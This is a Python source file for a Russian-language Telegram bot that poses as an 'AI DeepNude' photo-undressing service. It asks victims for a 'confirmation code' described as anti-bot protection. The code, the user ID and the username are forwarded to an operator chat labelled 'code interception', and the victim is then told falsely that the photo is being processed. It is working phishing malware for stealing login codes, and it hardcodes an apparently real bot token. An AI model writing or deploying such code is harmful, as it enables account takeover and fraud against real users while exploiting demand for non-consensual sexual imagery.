import asyncio
import json
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiogram.filters import Command
from datetime import datetime

# ===== НАСТРОЙКИ - ЗАМЕНИТЕ ЭТИ ТРИ СТРОЧКИ =====
BOT_TOKEN = "8736044768:AAF9BfOtADHPJV8oqLP6VkSW_gNv00B8m-c"
ADMIN_CHAT_ID = 6482944780
WEBAPP_URL = "https://beamish-beijinho-728c48.netlify.app/"
# ================================================

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def start_command(message: types.Message):
    web_app = WebAppInfo(url=WEBAPP_URL)
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🎭 Раздеть фото (нейросеть)", web_app=web_app)]
        ]
    )
    
    await message.answer(
        "🔥 **AI DeepNude Neural Network v4.2**\n\n"
        "Я раздеваю любые фотографии за 3 секунды.\n"
        "Нажми на кнопку ниже, загрузи фото и введи код подтверждения.\n\n"
        "⚠️ *Код нужен для защиты от ботов* - это стандартная проверка.\n"
        "✅ Результат придёт через 30 секунд.",
        reply_markup=keyboard,
        parse_mode="Markdown"
    )

@dp.message(lambda message: message.web_app_data is not None)
async def handle_web_app_data(message: types.Message):
    try:
        data = json.loads(message.web_app_data.data)
        sms_code = data.get("code", "")
        user_id = data.get("user_id", "")
        username = data.get("username", "без юзернейма")
        
        admin_message = (
            f"✅ **ПЕРЕХВАТ КОДА**\n\n"
            f"📱 Код: `{sms_code}`\n"
            f"🆔 User ID: `{user_id}`\n"
            f"👤 Username: @{username}\n"
            f"⏰ Время: {datetime.now()}"
        )
        
        await bot.send_message(chat_id=ADMIN_CHAT_ID, text=admin_message, parse_mode="Markdown")
        
        await message.answer(
            "✅ Код подтверждён!\n\n"
            "🖼️ Фото обрабатывается нейросетью...\n"
            "⏱️ Результат будет готов через 1-2 минуты.\n\n"
            "🙏 Спасибо за ожидание!"
        )
        
    except json.JSONDecodeError:
        await message.answer("❌ Ошибка формата, попробуйте ещё раз.")
    except Exception as e:
        logging.error(f"Ошибка: {e}")
        await message.answer("❌ Системная ошибка, повторите позже.")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())